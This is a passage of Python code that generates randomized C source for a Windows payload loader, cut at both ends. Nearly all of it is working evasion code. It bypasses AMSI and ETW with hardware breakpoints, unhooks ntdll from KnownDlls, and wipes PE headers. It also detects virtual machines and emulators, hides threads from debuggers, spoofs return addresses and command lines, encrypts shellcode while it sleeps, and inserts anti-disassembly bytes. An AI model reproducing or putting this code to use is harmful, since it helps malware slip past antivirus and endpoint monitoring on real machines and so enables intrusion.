    lines.append("    if (%s->ExceptionRecord->ExceptionCode == 0x80000004) {" % ep)
    if do_amsi:
        lines.append("        if (%s && %s->ContextRecord->Rip == (DWORD64)%s) {" % (g0, ep, g0))
        lines.append("            %s->ContextRecord->Rax = 0x80070057;" % ep)
        lines.append("            %s->ContextRecord->Rip = *(DWORD64*)%s->ContextRecord->Rsp;" % (ep, ep))
        lines.append("            %s->ContextRecord->Rsp += 8;" % ep)
        lines.append("            return -1;")
        lines.append("        }")
    if do_etw:
        lines.append("        if (%s && %s->ContextRecord->Rip == (DWORD64)%s) {" % (g1, ep, g1))
        lines.append("            %s->ContextRecord->Rax = 0;" % ep)
        lines.append("            %s->ContextRecord->Rip = *(DWORD64*)%s->ContextRecord->Rsp;" % (ep, ep))
        lines.append("            %s->ContextRecord->Rsp += 8;" % ep)
        lines.append("            return -1;")
        lines.append("        }")
    lines.append("    }")
    lines.append("    return 0;")
    lines.append("}")
    lines.append("")
    lines.append("void %s() {" % setup_fn)
    ptr_aveh, r_aveh = gen_resolve_raw(resolve_fn, "ntdll.dll", "RtlAddVectoredExceptionHandler")
    td_aveh = rand_id(8)
    lines.append(r_aveh)
    lines.append("    typedef void* (NTAPI* %s)(ULONG, void*);" % td_aveh)
    lines.append("    if (!%s) return;" % ptr_aveh)
    if do_amsi:
        ptr_lla, r_lla = gen_resolve_one(resolve_fn, 'LoadLibraryA')
        lines.append(r_lla)
        amsi_var = rand_id(8)
        lines.append(c_stack_string("amsi.dll", amsi_var))
        lines.append("    if (%s) %s(%s);" % (ptr_lla, ptr_lla, amsi_var))
        ptr_asb, r_asb = gen_resolve_raw(resolve_fn, "amsi.dll", "AmsiScanBuffer")
        lines.append(r_asb)
        lines.append("    %s = %s;" % (g0, ptr_asb))
    if do_etw:
        ptr_etw, r_etw = gen_resolve_raw(resolve_fn, "ntdll.dll", "EtwEventWrite")
        lines.append(r_etw)
        lines.append("    %s = %s;" % (g1, ptr_etw))
    lines.append("    ((%s)%s)(1, %s);" % (td_aveh, ptr_aveh, handler_fn))
    ptr_ngct, r_ngct = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtGetContextThread")
    ptr_nsct, r_nsct = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtSetContextThread")
    td_ctx = rand_id(8)
    ctx = rand_id(6)
    lines.append(r_ngct)
    lines.append(r_nsct)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE, CONTEXT*);" % td_ctx)
    lines.append("    if (!%s || !%s) return;" % (ptr_ngct, ptr_nsct))
    lines.append("    CONTEXT %s;" % ctx)
    lines.append("    memset(&%s, 0, sizeof(%s));" % (ctx, ctx))
    lines.append("    %s.ContextFlags = 0x00100010;" % ctx)
    lines.append("    ((%s)%s)((HANDLE)(LONG_PTR)-2, &%s);" % (td_ctx, ptr_ngct, ctx))
    if do_amsi:
        lines.append("    if (%s) {" % g0)
        lines.append("        %s.Dr0 = (DWORD64)%s;" % (ctx, g0))
        lines.append("        %s.Dr7 |= 1;" % ctx)
        lines.append("        %s.Dr7 &= ~((DWORD64)0xF << 16);" % ctx)
        lines.append("    }")
    if do_etw:
        lines.append("    if (%s) {" % g1)
        lines.append("        %s.Dr1 = (DWORD64)%s;" % (ctx, g1))
        lines.append("        %s.Dr7 |= 4;" % ctx)
        lines.append("        %s.Dr7 &= ~((DWORD64)0xF << 20);" % ctx)
        lines.append("    }")
    lines.append("    ((%s)%s)((HANDLE)(LONG_PTR)-2, &%s);" % (td_ctx, ptr_nsct, ctx))
    lines.append("}")
    return setup_fn, "\n".join(lines)

def gen_cfg_guard(resolve_fn):
    fn = rand_id()
    av = rand_id(6)
    sv = rand_id(6)
    ct = rand_id(8)
    iv = rand_id(6)
    ptr_spvct, r_spvct = gen_resolve_one(resolve_fn, 'SetProcessValidCallTargets')
    lines = ["static void %s(void* %s, SIZE_T %s) {" % (fn, av, sv)]
    lines.append(r_spvct)
    lines.append("    typedef struct { ULONG_PTR Offset; ULONG_PTR Flags; } %s;" % ct)
    lines.append("    %s %s;" % (ct, iv))
    lines.append("    %s.Offset = 0;" % iv)
    lines.append("    %s.Flags = 1;" % iv)
    lines.append("    if (%s) %s((HANDLE)-1, %s, %s, 1, &%s);" % (ptr_spvct, ptr_spvct, av, sv, iv))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_pe_header_wipe(resolve_fn):
    fn = rand_id()
    hm = rand_id(8)
    op = rand_id(6)
    sz = rand_id(6)
    dh = rand_id(8)
    nh = rand_id(8)
    pv = rand_id(6)
    zv = rand_id(6)
    p, rc = _multi_resolve(resolve_fn, ['VirtualProtect', 'GetModuleHandleA'])
    lines = ["void %s() {" % fn]
    lines.extend(rc)
    lines.append("    HMODULE %s = %s(NULL);" % (hm, p['GetModuleHandleA']))
    lines.append("    if (!%s) return;" % hm)
    lines.append("    PIMAGE_DOS_HEADER %s = (PIMAGE_DOS_HEADER)%s;" % (dh, hm))
    lines.append("    PIMAGE_NT_HEADERS %s = (PIMAGE_NT_HEADERS)((unsigned char*)%s + %s->e_lfanew);" % (nh, hm, dh))
    lines.append("    SIZE_T %s = %s->OptionalHeader.SizeOfHeaders;" % (sz, nh))
    lines.append("    DWORD %s;" % op)
    lines.append("    if (%s(%s, %s, PAGE_READWRITE, &%s)) {" % (p['VirtualProtect'], hm, sz, op))
    lines.append("        volatile unsigned char* %s = (volatile unsigned char*)%s;" % (pv, hm))
    lines.append("        for (SIZE_T %s = 0; %s < %s; %s++) %s[%s] = 0;" % (zv, zv, sz, zv, pv, zv))
    lines.append("        %s(%s, %s, %s, &%s);" % (p['VirtualProtect'], hm, sz, op, op))
    lines.append("    }")
    lines.append("}")
    return fn, "\n".join(lines)

def gen_anti_emulation(resolve_fn, exit_fn):
    fn = rand_id()
    sc = rand_id(6)
    v1 = rand_id(6)
    v2 = rand_id(6)
    v3 = rand_id(6)
    v4 = rand_id(6)
    v5 = rand_id(6)
    p, rc = _multi_resolve(resolve_fn, ['GetTickCount64', 'GlobalMemoryStatusEx'])
    lines = ["void %s() {" % fn]
    lines.extend(rc)
    lines.append("    int %s = 0;" % sc)
    lines.append("#ifdef _MSC_VER")
    lines.append("    int %s[4];" % v1)
    lines.append("    __cpuid(%s, 0);" % v1)
    lines.append("    if (%s[1] == 0x756E6547 && %s[3] == 0x49656E69 && %s[2] == 0x6C65746E) {} else" % (v1, v1, v1))
    lines.append("    if (%s[1] == 0x68747541 && %s[3] == 0x69746E65 && %s[2] == 0x444D4163) {} else %s++;" % (v1, v1, v1, sc))
    lines.append("    __cpuid(%s, 1);" % v1)
    lines.append("    if (%s[2] & (1 << 31)) %s++;" % (v1, sc))
    hv1 = rand_id(6)
    lines.append("    __cpuid(%s, 0x40000000);" % v1)
    lines.append("    char %s[13]; memcpy(%s, &%s[1], 12); %s[12] = 0;" % (hv1, hv1, v1, hv1))
    lines.append("    if (memcmp(%s, \"VMwareVMware\", 12) == 0) %s++;" % (hv1, sc))
    lines.append("    if (memcmp(%s, \"Microsoft Hv\", 12) == 0) %s++;" % (hv1, sc))
    lines.append("    if (memcmp(%s, \"KVMKVMKVM\\0\\0\\0\", 12) == 0) %s++;" % (hv1, sc))
    lines.append("    if (memcmp(%s, \"XenVMMXenVMM\", 12) == 0) %s++;" % (hv1, sc))
    lines.append("#else")
    lines.append("    unsigned int %s, %s, %s, %s;" % (v2, v3, v4, v5))
    lines.append("    __asm__ volatile (\"cpuid\" : \"=a\"(%s), \"=b\"(%s), \"=c\"(%s), \"=d\"(%s) : \"a\"(0));" % (v2, v3, v4, v5))
    lines.append("    if (%s == 0x756E6547 && %s == 0x49656E69 && %s == 0x6C65746E) {} else" % (v3, v5, v4))
    lines.append("    if (%s == 0x68747541 && %s == 0x69746E65 && %s == 0x444D4163) {} else %s++;" % (v3, v5, v4, sc))
    lines.append("    __asm__ volatile (\"cpuid\" : \"=a\"(%s), \"=b\"(%s), \"=c\"(%s), \"=d\"(%s) : \"a\"(1));" % (v2, v3, v4, v5))
    lines.append("    if (%s & (1 << 31)) %s++;" % (v4, sc))
    hv2 = rand_id(6)
    lines.append("    __asm__ volatile (\"cpuid\" : \"=a\"(%s), \"=b\"(%s), \"=c\"(%s), \"=d\"(%s) : \"a\"(0x40000000));" % (v2, v3, v4, v5))
    lines.append("    char %s[13]; memcpy(%s, &%s, 4); memcpy(%s+4, &%s, 4); memcpy(%s+8, &%s, 4); %s[12] = 0;" % (hv2, hv2, v3, hv2, v4, hv2, v5, hv2))
    lines.append("    if (memcmp(%s, \"VMwareVMware\", 12) == 0) %s++;" % (hv2, sc))
    lines.append("    if (memcmp(%s, \"Microsoft Hv\", 12) == 0) %s++;" % (hv2, sc))
    lines.append("    if (memcmp(%s, \"KVMKVMKVM\\0\\0\\0\", 12) == 0) %s++;" % (hv2, sc))
    lines.append("    if (memcmp(%s, \"XenVMMXenVMM\", 12) == 0) %s++;" % (hv2, sc))
    lines.append("#endif")
    t1 = rand_id(6)
    t2 = rand_id(6)
    iv = rand_id(6)
    lines.append("    ULONGLONG %s = %s();" % (t1, p['GetTickCount64']))
    lines.append("    volatile unsigned long long %s = 0;" % t2)
    lines.append("    for (int %s = 0; %s < 10000000; %s++) %s += %s;" % (iv, iv, iv, t2, iv))
    dt = rand_id(6)
    lines.append("    ULONGLONG %s = %s() - %s;" % (dt, p['GetTickCount64'], t1))
    lines.append("    if (%s == 0) %s++;" % (dt, sc))
    cr0 = rand_id(6)
    lines.append("#ifdef _MSC_VER")
    lines.append("    unsigned long long %s = __rdtsc();" % cr0)
    lines.append("#else")
    lines.append("    unsigned long long %s;" % cr0)
    lines.append("    unsigned int %s_lo, %s_hi;" % (cr0, cr0))
    lines.append("    __asm__ volatile (\"rdtsc\" : \"=a\"(%s_lo), \"=d\"(%s_hi));" % (cr0, cr0))
    lines.append("    %s = ((unsigned long long)%s_hi << 32) | %s_lo;" % (cr0, cr0, cr0))
    lines.append("#endif")
    lines.append("    if (%s == 0) %s++;" % (cr0, sc))
    ms = rand_id(6)
    lines.append("    typedef struct { DWORD dwLength; DWORD dwMemoryLoad; DWORDLONG ullTotalPhys; DWORDLONG ullAvailPhys; DWORDLONG ullTotalPageFile; DWORDLONG ullAvailPageFile; DWORDLONG ullTotalVirtual; DWORDLONG ullAvailVirtual; DWORDLONG ullAvailExtendedVirtual; } %s_t;" % ms)
    lines.append("    %s_t %s; memset(&%s, 0, sizeof(%s));" % (ms, ms, ms, ms))
    lines.append("    %s.dwLength = sizeof(%s);" % (ms, ms))
    lines.append("    %s(&%s);" % (p['GlobalMemoryStatusEx'], ms))
    lines.append("    if (%s.ullTotalPhys < 2147483648ULL) %s++;" % (ms, sc))
    fw = rand_id(6)
    lines.append("#ifndef _MSC_VER")
    lines.append("    double %s = 1.0;" % fw)
    lines.append("    __asm__ volatile (\"fldpi\" : \"=t\"(%s));" % fw)
    lines.append("    if (%s < 3.14 || %s > 3.15) %s++;" % (fw, fw, sc))
    lines.append("#endif")
    lines.append("    if (%s >= 2) %s(0);" % (sc, exit_fn))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_thread_hide(resolve_fn):
    fn = rand_id()
    ptr_nsit, r_nsit = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtSetInformationThread")
    td = rand_id(8)
    lines = ["void %s() {" % fn]
    lines.append(r_nsit)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE, ULONG, PVOID, ULONG);" % td)
    lines.append("    if (%s) ((%s)%s)((HANDLE)(LONG_PTR)-2, 0x11, NULL, 0);" % (ptr_nsit, td, ptr_nsit))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_heap_encrypt(resolve_fn):
    fn = rand_id()
    bv = rand_id(6)
    sv = rand_id(6)
    k = secrets.token_bytes(16)
    key_hex = ", ".join("0x%02x" % b for b in k)
    kv = rand_id(8)
    iv = rand_id(6)
    lines = ["static void %s(unsigned char* %s, unsigned int %s) {" % (fn, bv, sv)]
    lines.append("    unsigned char %s[] = {%s};" % (kv, key_hex))
    lines.append("    for (unsigned int %s = 0; %s < %s; %s++) %s[%s] ^= %s[%s %% 16];" % (iv, iv, sv, iv, bv, iv, kv, iv))
    lines.append("}")
    return fn, "\n".join(lines), k

def gen_knowndlls_unhook(resolve_fn):
    fn = rand_id()
    ptr_nos, r_nos = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtOpenSection")
    ptr_nmvos, r_nmvos = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtMapViewOfSection")
    ptr_numvos, r_numvos = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtUnmapViewOfSection")
    ptr_nc, r_nc = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtClose")
    td_nos = rand_id(8)
    td_nmvos = rand_id(8)
    td_numvos = rand_id(8)
    td_nc = rand_id(8)
    hsec = rand_id(8)
    mb = rand_id(8)
    oa = rand_id(8)
    us = rand_id(8)
    vw = rand_id(6)
    st = rand_id(6)
    ml = rand_id(8)
    dh = rand_id(8)
    nh = rand_id(8)
    sec = rand_id(8)
    iv = rand_id(6)
    dst = rand_id(8)
    src = rand_id(8)
    op = rand_id(8)
    p_vp, r_vp = gen_resolve_one(resolve_fn, 'VirtualProtect')
    p_gmh, r_gmh = gen_resolve_one(resolve_fn, 'GetModuleHandleA')
    nd = rand_id(8)
    name_buf = rand_id(8)
    lines = ["void %s() {" % fn]
    lines.append(r_nos)
    lines.append(r_nmvos)
    lines.append(r_numvos)
    lines.append(r_nc)
    lines.append(r_vp)
    lines.append(r_gmh)
    lines.append("    typedef LONG (NTAPI* %s)(PHANDLE,ACCESS_MASK,void*);" % td_nos)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,ULONG,ULONG,ULONG);" % td_nmvos)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE,PVOID);" % td_numvos)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE);" % td_nc)
    lines.append("    if (!%s || !%s || !%s || !%s) return;" % (ptr_nos, ptr_nmvos, ptr_numvos, ptr_nc))
    lines.append("    typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } %s_t;" % us)
    lines.append("    typedef struct { ULONG Length; HANDLE RootDirectory; %s_t* ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } %s_t;" % (us, oa))
    lines.append("    wchar_t %s[] = L\"\\\\KnownDlls\\\\ntdll.dll\";" % name_buf)
    lines.append("    %s_t %s;" % (us, us))
    lines.append("    %s.Buffer = %s; %s.Length = sizeof(%s) - 2; %s.MaximumLength = sizeof(%s);" % (us, name_buf, us, name_buf, us, name_buf))
    lines.append("    %s_t %s; memset(&%s, 0, sizeof(%s));" % (oa, oa, oa, oa))
    lines.append("    %s.Length = sizeof(%s); %s.ObjectName = &%s; %s.Attributes = 0x40;" % (oa, oa, oa, us, oa))
    lines.append("    HANDLE %s = NULL;" % hsec)
    lines.append("    LONG %s = ((%s)%s)(&%s, 0x000F0007u, &%s);" % (st, td_nos, ptr_nos, hsec, oa))
    lines.append("    if (%s < 0 || !%s) return;" % (st, hsec))
    lines.append("    void* %s = NULL; SIZE_T %s = 0;" % (mb, vw))
    lines.append("    %s = ((%s)%s)(%s, (HANDLE)-1, &%s, 0, 0, NULL, &%s, 1, 0, PAGE_READONLY);" % (st, td_nmvos, ptr_nmvos, hsec, mb, vw))
    lines.append("    if (%s < 0 || !%s) { ((%s)%s)(%s); return; }" % (st, mb, td_nc, ptr_nc, hsec))
    lines.append(c_stack_string("ntdll.dll", nd))
    lines.append("    HMODULE %s = %s(%s);" % (ml, p_gmh, nd))
    lines.append("    if (!%s) { ((%s)%s)((HANDLE)-1, %s); ((%s)%s)(%s); return; }" % (ml, td_numvos, ptr_numvos, mb, td_nc, ptr_nc, hsec))
    lines.append("    PIMAGE_DOS_HEADER %s = (PIMAGE_DOS_HEADER)%s;" % (dh, mb))
    lines.append("    PIMAGE_NT_HEADERS %s = (PIMAGE_NT_HEADERS)((unsigned char*)%s + %s->e_lfanew);" % (nh, mb, dh))
    lines.append("    PIMAGE_SECTION_HEADER %s = IMAGE_FIRST_SECTION(%s);" % (sec, nh))
    lines.append("    for (int %s = 0; %s < %s->FileHeader.NumberOfSections; %s++) {" % (iv, iv, nh, iv))
    lines.append("        if (%s[%s].Characteristics & IMAGE_SCN_MEM_EXECUTE) {" % (sec, iv))
    lines.append("            unsigned char* %s = (unsigned char*)%s + %s[%s].VirtualAddress;" % (dst, ml, sec, iv))
    lines.append("            unsigned char* %s = (unsigned char*)%s + %s[%s].VirtualAddress;" % (src, mb, sec, iv))
    lines.append("            DWORD %s;" % op)
    lines.append("            if (%s(%s, %s[%s].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &%s)) {" % (p_vp, dst, sec, iv, op))
    lines.append("                memcpy(%s, %s, %s[%s].Misc.VirtualSize);" % (dst, src, sec, iv))
    lines.append("                %s(%s, %s[%s].Misc.VirtualSize, %s, &%s);" % (p_vp, dst, sec, iv, op, op))
    lines.append("            }")
    lines.append("            break;")
    lines.append("        }")
    lines.append("    }")
    lines.append("    ((%s)%s)((HANDLE)-1, %s);" % (td_numvos, ptr_numvos, mb))
    lines.append("    ((%s)%s)(%s);" % (td_nc, ptr_nc, hsec))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_return_addr_spoof(resolve_fn):
    setup_fn = rand_id()
    begin_fn = rand_id()
    end_fn = rand_id()
    ret_gad = rand_id(8)
    p_k32 = rand_id(8)
    dh = rand_id(6)
    nh = rand_id(6)
    sc_v = rand_id(6)
    iv = rand_id(6)
    st_v = rand_id(6)
    jv = rand_id(6)
    sv = rand_id(6)
    ff = rand_id(6)
    cf = rand_id(6)
    pp = rand_id(6)
    k32_hash = djb2_hash("kernel32.dll")
    lines = ["static void* %s = NULL;" % ret_gad]
    lines.append("static void %s() {" % setup_fn)
    lines.append("    void* %s = (void*)%s(0x%08xu, 0);" % (p_k32, resolve_fn, k32_hash))
    lines.append("    if (!%s) return;" % p_k32)
    lines.append("    PIMAGE_DOS_HEADER %s = (PIMAGE_DOS_HEADER)%s;" % (dh, p_k32))
    lines.append("    PIMAGE_NT_HEADERS %s = (PIMAGE_NT_HEADERS)((unsigned char*)%s + %s->e_lfanew);" % (nh, p_k32, dh))
    lines.append("    PIMAGE_SECTION_HEADER %s = IMAGE_FIRST_SECTION(%s);" % (sc_v, nh))
    lines.append("    for (int %s = 0; %s < %s->FileHeader.NumberOfSections; %s++) {" % (iv, iv, nh, iv))
    lines.append("        if (%s[%s].Characteristics & IMAGE_SCN_MEM_EXECUTE) {" % (sc_v, iv))
    lines.append("            unsigned char* %s = (unsigned char*)%s + %s[%s].VirtualAddress;" % (st_v, p_k32, sc_v, iv))
    lines.append("            for (DWORD %s = 0; %s < %s[%s].Misc.VirtualSize; %s++) {" % (jv, jv, sc_v, iv, jv))
    lines.append("                if (%s[%s] == 0xC3) { %s = &%s[%s]; return; }" % (st_v, jv, ret_gad, st_v, jv))
    lines.append("            }")
    lines.append("            break;")
    lines.append("        }")
    lines.append("    }")
    lines.append("}")
    lines.append("#ifdef __GNUC__")
    lines.append("#pragma GCC push_options")
    lines.append('#pragma GCC optimize("no-omit-frame-pointer")')
    lines.append("static void* __attribute__((noinline)) %s() {" % begin_fn)
    lines.append("    void** %s = (void**)__builtin_frame_address(0);" % ff)
    lines.append("    void** %s = (void**)%s[0];" % (cf, ff))
    lines.append("    void* %s = %s[1];" % (sv, cf))
    lines.append("    if (%s) %s[1] = %s;" % (ret_gad, cf, ret_gad))
    lines.append("    return %s;" % sv)
    lines.append("}")
    lines.append("static void __attribute__((noinline)) %s(void* %s) {" % (end_fn, sv))
    lines.append("    void** %s = (void**)__builtin_frame_address(0);" % ff)
    lines.append("    void** %s = (void**)%s[0];" % (cf, ff))
    lines.append("    %s[1] = %s;" % (cf, sv))
    lines.append("}")
    lines.append("#pragma GCC pop_options")
    lines.append("#elif defined(_MSC_VER)")
    lines.append('#pragma optimize("y", off)')
    lines.append("static void* __declspec(noinline) %s() {" % begin_fn)
    lines.append("    void** %s = (void**)_AddressOfReturnAddress();" % pp)
    lines.append("    void** %s = (void**)*(%s-1);" % (cf, pp))
    lines.append("    void* %s = %s[1];" % (sv, cf))
    lines.append("    if (%s) %s[1] = %s;" % (ret_gad, cf, ret_gad))
    lines.append("    return %s;" % sv)
    lines.append("}")
    lines.append("static void __declspec(noinline) %s(void* %s) {" % (end_fn, sv))
    lines.append("    void** %s = (void**)_AddressOfReturnAddress();" % pp)
    lines.append("    void** %s = (void**)*(%s-1);" % (cf, pp))
    lines.append("    %s[1] = %s;" % (cf, sv))
    lines.append("}")
    lines.append('#pragma optimize("", on)')
    lines.append("#endif")
    return setup_fn, "\n".join(lines), begin_fn, end_fn

def gen_cmdline_spoof(resolve_fn):
    fn = rand_id()
    hp = rand_id(6)
    sv = rand_id(6)
    pp = rand_id(6)
    rl = rand_id(6)
    cf = rand_id(6)
    wb = rand_id(6)
    p_nqip, r_nqip = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtQueryInformationProcess")
    ptr_rpm, r_rpm = gen_resolve_one(resolve_fn, 'ReadProcessMemory')
    ptr_wpm, r_wpm = gen_resolve_one(resolve_fn, 'WriteProcessMemory')
    td_nqip = rand_id(8)
    pbi_t = rand_id(8)
    lines = ["static void %s(HANDLE %s) {" % (fn, hp)]
    lines.append(r_nqip)
    lines.append(r_rpm)
    lines.append(r_wpm)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE,int,void*,ULONG,PULONG);" % td_nqip)
    lines.append("    if (!%s || !%s || !%s) return;" % (p_nqip, ptr_rpm, ptr_wpm))
    lines.append("    typedef struct { ULONG_PTR ExitStatus; void* PebBaseAddress; ULONG_PTR pad[4]; } %s;" % pbi_t)
    lines.append("    %s %s; memset(&%s, 0, sizeof(%s));" % (pbi_t, sv, sv, sv))
    lines.append("    ULONG %s = 0;" % rl)
    lines.append("    ((%s)%s)(%s, 0, &%s, sizeof(%s), &%s);" % (td_nqip, p_nqip, hp, sv, sv, rl))
    lines.append("    if (!%s.PebBaseAddress) return;" % sv)
    lines.append("    void* %s = NULL;" % pp)
    lines.append("    %s(%s, (char*)%s.PebBaseAddress + 0x20, &%s, sizeof(%s), NULL);" % (ptr_rpm, hp, sv, pp, pp))
    lines.append("    if (!%s) return;" % pp)
    lines.append("    USHORT %s = 0;" % wb)
    lines.append("    %s(%s, (char*)%s + 0x70, &%s, 2, NULL);" % (ptr_wpm, hp, pp, wb))
    lines.append("    %s(%s, (char*)%s + 0x72, &%s, 2, NULL);" % (ptr_wpm, hp, pp, wb))
    lines.append("    void* %s = NULL;" % cf)
    lines.append("    %s(%s, (char*)%s + 0x78, &%s, sizeof(void*), NULL);" % (ptr_rpm, hp, pp, cf))
    lines.append("    if (%s) { wchar_t %s_z = 0; %s(%s, %s, &%s_z, 2, NULL); }" % (cf, cf, ptr_wpm, hp, cf, cf))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_shellcode_fluctuate(resolve_fn, sc_map=None):
    gb = rand_id()
    gs = rand_id()
    fn = rand_id()
    ptr_vp, r_vp = gen_resolve(resolve_fn, 'VirtualProtect', sc_map)
    tp, trc = _multi_resolve(resolve_fn, [
        'CreateEventW', 'CreateTimerQueue', 'CreateTimerQueueTimer',
        'WaitForSingleObject', 'DeleteTimerQueueEx', 'SetEvent'])
    fl_key = secrets.token_bytes(16)
    key_hex = ", ".join("0x%02x" % b for b in fl_key)
    xk = rand_id(8)
    ev = rand_id(8)
    hq = rand_id(8)
    ht = rand_id(8)
    op = rand_id(8)
    iv2 = rand_id(6)
    iv3 = rand_id(6)
    globals_code = "void* %s = NULL;\nSIZE_T %s = 0;" % (gb, gs)
    lines = ["void %s() {" % fn]
    if r_vp:
        lines.append(r_vp)
    lines.extend(trc)
    lines.append("    HANDLE %s = %s(NULL, FALSE, FALSE, NULL);" % (ev, tp['CreateEventW']))
    lines.append("    if (!%s) return;" % ev)
    lines.append("    unsigned char %s[] = {%s};" % (xk, key_hex))
    lines.append("    while (1) {")
    lines.append("        DWORD %s;" % op)
    lines.append("        %s(%s, (SIZE_T)%s, PAGE_READWRITE, &%s);" % (ptr_vp, gb, gs, op))
    lines.append("        for (SIZE_T %s = 0; %s < (SIZE_T)%s; %s++) ((unsigned char*)%s)[%s] ^= %s[%s %% 16];" % (iv2, iv2, gs, iv2, gb, iv2, xk, iv2))
    lines.append("        %s(%s, (SIZE_T)%s, PAGE_NOACCESS, &%s);" % (ptr_vp, gb, gs, op))
    lines.append("        HANDLE %s = %s();" % (hq, tp['CreateTimerQueue']))
    lines.append("        HANDLE %s = NULL;" % ht)
    fl_delay = rand_id(6)
    lines.append("        DWORD %s = %d + (GetTickCount64() %% %d);" % (fl_delay, random.randint(15000, 25000), random.randint(10000, 35000)))
    lines.append("        %s(&%s, %s, (void*)%s, %s, %s, 0, 0x00000020);" % (tp['CreateTimerQueueTimer'], ht, hq, tp['SetEvent'], ev, fl_delay))
    lines.append("        %s(%s, 0xFFFFFFFF);" % (tp['WaitForSingleObject'], ev))
    lines.append("        %s(%s, 0xFFFFFFFF);" % (tp['WaitForSingleObject'], ev))
    lines.append("        %s(%s, NULL);" % (tp['DeleteTimerQueueEx'], hq))
    lines.append("        for (SIZE_T %s = 0; %s < (SIZE_T)%s; %s++) ((unsigned char*)%s)[%s] ^= %s[%s %% 16];" % (iv3, iv3, gs, iv3, gb, iv3, xk, iv3))
    lines.append("        %s(%s, (SIZE_T)%s, PAGE_EXECUTE_READ, &%s);" % (ptr_vp, gb, gs, op))
    lines.append("    }")
    lines.append("}")
    return fn, gb, gs, globals_code, "\n".join(lines)

def gen_anti_disasm():
    v1 = rand_id(6)
    v2 = rand_id(6)
    patterns = []
    patterns.append("    __asm__ volatile (\".byte 0xEB,0x01,0xE8\");")
    patterns.append("    __asm__ volatile (\".byte 0x74,0x01,0xE8\");")
    patterns.append("    __asm__ volatile (\".byte 0xEB,0x02,0xCD,0x03\");")
    patterns.append("    volatile int %s = 1; if (%s) __asm__ volatile(\"nop\"); else __asm__ volatile(\".byte 0xE8\");" % (v1, v1))
    patterns.append("    __asm__ volatile (\".byte 0x75,0x01,0xE9\");")
    chosen = random.sample(patterns, k=min(3, len(patterns)))
    return "\n".join(chosen)

def gen_hmac_verify(key, data):
    import hmac as _hmac
    mac = _hmac.new(key, data, hashlib.sha256).digest()
    fn = rand_id()
    dv = rand_id(6)
    dl = rand_id(6)
    kv = rand_id(8)
    mv = rand_id(8)
    ha = rand_id(6)
    hk = rand_id(6)
    hm = rand_id(6)
    rl = rand_id(6)
    out = rand_id(6)
    iv = rand_id(6)
    st = rand_id(6)
    key_hex = ", ".join("0x%02x" % b for b in key[:32])
    mac_hex = ", ".join("0x%02x" % b for b in mac)
    code = "static int %s(unsigned char* %s, unsigned int %s) {\n" % (fn, dv, dl)
    code += "    unsigned char %s[] = {%s};\n" % (kv, key_hex)
    code += "    unsigned char %s[] = {%s};\n" % (mv, mac_hex)
    code += "    BCRYPT_ALG_HANDLE %s = NULL; BCRYPT_HASH_HANDLE %s = NULL;\n" % (ha, hk)
    code += "    NTSTATUS %s = BCryptOpenAlgorithmProvider(&%s, BCRYPT_SHA256_ALGORITHM, NULL, 0x00000008);\n" % (st, ha)
    code += "    if (%s != 0) return 0;\n" % st
    code += "    %s = BCryptCreateHash(%s, &%s, NULL, 0, %s, sizeof(%s), 0);\n" % (st, ha, hk, kv, kv)
    code += "    if (%s != 0) { BCryptCloseAlgorithmProvider(%s, 0); return 0; }\n" % (st, ha)
    code += "    BCryptHashData(%s, %s, %s, 0);\n" % (hk, dv, dl)
    code += "    unsigned char %s[32];\n" % out
    code += "    BCryptFinishHash(%s, %s, 32, 0);\n" % (hk, out)
    code += "    BCryptDestroyHash(%s); BCryptCloseAlgorithmProvider(%s, 0);\n" % (hk, ha)
    code += "    volatile int %s = 0;\n" % hm
    code += "    for (int %s = 0; %s < 32; %s++) %s |= %s[%s] ^ %s[%s];\n" % (iv, iv, iv, hm, out, iv, mv, iv)
    code += "    return %s == 0;\n" % hm
    code += "}\n"
    return fn, code, mac

def gen_stub_encrypt():
    enc_fn = rand_id()
    bv = rand_id(6)
    sv = rand_id(6)
    k = secrets.token_bytes(8)
    key_hex = ", ".join("0x%02x" % b for b in k)
    kv = rand_id(8)
    iv = rand_id(6)
    op = rand_id(6)
    stub_sz_const = "21"
    code = "static unsigned char %s[] = {%s};\n" % (kv, key_hex)
    code += "static void %s(unsigned char* %s, SIZE_T %s) {\n" % (enc_fn, bv, sv)
    code += "    DWORD %s;\n" % op
    code += "    VirtualProtect(%s, %s, PAGE_READWRITE, &%s);\n" % (bv, sv, op)
    code += "    for (SIZE_T %s = 0; %s < %s; %s++) %s[%s] ^= %s[%s %% 8];\n" % (iv, iv, sv, iv, bv, iv, kv, iv)
    code += "    VirtualProtect(%s, %s, %s, &%s);\n" % (bv, sv, op, op)
    code += "}\n"
    return enc_fn, kv, stub_sz_const, code

def gen_unhook_ntdll(resolve_fn):
    fn = rand_id()
    nd = rand_id(8)
    fp = rand_id(8)
    hf = rand_id(8)
    hm = rand_id(8)
    mb = rand_id(8)
    ml = rand_id(8)
    dh = rand_id(8)
    nh = rand_id(8)
    sec = rand_id(8)
    iv = rand_id(6)
    dst = rand_id(8)
    src = rand_id(8)
    op = rand_id(8)
    kv = rand_id(6)
    p, rc = _multi_resolve(resolve_fn, [
        'VirtualProtect', 'GetModuleHandleA', 'CreateFileA',
        'CreateFileMappingA', 'MapViewOfFile', 'UnmapViewOfFile',
        'GetSystemDirectoryA', 'CloseHandle'])
    lines = ["void %s() {" % fn]
